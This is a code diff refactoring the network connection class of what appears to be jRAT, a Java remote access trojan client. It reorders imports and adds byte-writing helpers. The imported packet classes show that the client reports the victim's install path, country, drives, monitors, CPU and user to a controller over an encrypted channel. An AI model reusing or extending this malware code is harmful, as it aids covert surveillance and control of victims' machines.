@@ -1,5 +1,8 @@
 package jrat.client;
 
+import jrat.client.modules.ModuleLoader;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.outgoing.*;
 import jrat.common.ConnectionCodes;
 import jrat.common.Constants;
 import jrat.common.Logger;
@@ -9,40 +12,18 @@ import jrat.common.crypto.CryptoUtils;
 import jrat.common.crypto.ObfuscatedStreamKeyExchanger;
 import jrat.common.crypto.StreamKeyExchanger;
 import jrat.common.io.StringWriter;
-import jrat.client.modules.ModuleLoader;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.client.packets.outgoing.Packet10InitInstallPath;
-import jrat.client.packets.outgoing.Packet11InitInstallationDate;
-import jrat.client.packets.outgoing.Packet12InitLocalAddress;
-import jrat.client.packets.outgoing.Packet13InitTotalMemory;
-import jrat.client.packets.outgoing.Packet14InitAvailableCores;
-import jrat.client.packets.outgoing.Packet15InitJavaPath;
-import jrat.client.packets.outgoing.Packet17InitDrives;
-import jrat.client.packets.outgoing.Packet18InitMonitors;
-import jrat.client.packets.outgoing.Packet19InitCPU;
-import jrat.client.packets.outgoing.Packet1InitHandshake;
-import jrat.client.packets.outgoing.Packet20Headless;
-import jrat.client.packets.outgoing.Packet2Status;
-import jrat.client.packets.outgoing.Packet3Initialized;
-import jrat.client.packets.outgoing.Packet4InitOperatingSystem;
-import jrat.client.packets.outgoing.Packet5InitUserHost;
-import jrat.client.packets.outgoing.Packet6InitVersion;
-import jrat.client.packets.outgoing.Packet7InitServerID;
-import jrat.client.packets.outgoing.Packet8InitCountry;
-import jrat.client.packets.outgoing.Packet9InitJavaVersion;
 
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.security.PublicKey;
-import javax.crypto.Cipher;
-import javax.crypto.CipherInputStream;
-import javax.crypto.CipherOutputStream;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
 
 public class Connection implements Runnable {
 
@@ -159,7 +140,7 @@ public class Connection implements Runnable {
 	}
 
 	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
-		packet.send(dos, getStringWriter());
+		packet.send(this);
 	}
 
 	public boolean isConnected() {
@@ -248,6 +229,14 @@ public class Connection implements Runnable {
 	public void writeLine(Object obj) throws Exception {
 		writeLine(obj.toString());
 	}
+
+	public void write(byte[] bytes) throws Exception {
+	    dos.write(bytes);
+    }
+
+    public void write(byte[] bytes, int off, int len) throws Exception {
+	    dos.write(bytes, off, len);
+    }
 
 	public void status(int status) {
 		addToSendQueue(new Packet2Status(status));
